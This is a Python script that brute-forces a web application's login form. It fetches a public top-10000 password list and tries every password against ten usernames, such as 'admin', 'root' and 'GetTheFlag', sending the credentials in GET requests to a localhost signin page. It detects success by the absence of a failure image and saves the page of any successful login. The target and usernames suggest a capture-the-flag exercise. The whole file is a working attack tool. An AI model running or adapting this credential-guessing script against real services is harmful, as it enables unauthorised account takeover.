from aiohttp import ClientSSLError, ClientTimeout
import aiohttp
import asyncio

SERVER_ENDPOINT = "http://localhost:8080"
BAD_AUTH_ERROR_IMAGE = '<img src="images/WrongAnswer.gif" alt="">'
RETRY_COUNT = 3
RETRY_DELAY = 3  # seconds
DELAY_BETWEEN_REQUESTS = 2  # seconds

async def retrieve_password_data_set():
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            raw_text_page = await response.text()
            splited_text_page = raw_text_page.split("\n")
            return splited_text_page

def get_endpoint(username, password):
    return f"{SERVER_ENDPOINT}/?page=signin&username={username}&password={password}&Login=Login#"

async def attempt_login(session, username, password, retry_count=RETRY_COUNT, retry_delay=RETRY_DELAY):
    for attempt in range(retry_count):
        try:
            endpoint_to_hit = get_endpoint(username, password)
            # Timeout 10 saniye olarak ayarlandı
            async with session.get(endpoint_to_hit, timeout=ClientTimeout(total=10)) as response:
                rendered_page = await response.text()
                attempt_failed = BAD_AUTH_ERROR_IMAGE in rendered_page

                if attempt_failed:
                    print(f"FAILURE for pair: username={username} password={password}")
                else:
                    print(f"SUCCESS for pair: username={username} password={password}")
                    print({'rendered_page': rendered_page})
                    print('_' * 10)
                    with open(f"success_{username}_{password}.html", "w") as f:
                        f.write(rendered_page)
                    return True
        except ClientSSLError as e:
            print(f"SSL error on attempt {attempt + 1} for username={username} password={password}: {e}")
            if attempt < retry_count - 1:
                print(f"Retrying after {retry_delay} seconds...")
                await asyncio.sleep(retry_delay)
        except Exception as e:
            print(f"Unknown error on attempt {attempt + 1} for username={username} password={password}: {e}")
            if attempt < retry_count - 1:
                print(f"Retrying after {retry_delay} seconds...")
                await asyncio.sleep(retry_delay)
        # Her sorgu arasında bekleme süresi ekleyin
        await asyncio.sleep(DELAY_BETWEEN_REQUESTS)
    return False

async def main():
    username_collection = [
        "wil", "admin", "user", "root",
        "me", "GetThe",
        "GetTheFlag", "meone", "metwo", "methree",
    ]
    password_collection = await retrieve_password_data_set()
    print("BRUTEFORCE STARTING")
    async with aiohttp.ClientSession() as session:
        for password in password_collection:
            tasks = []
            for username in username_collection:
                tasks.append(attempt_login(session, username, password))
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())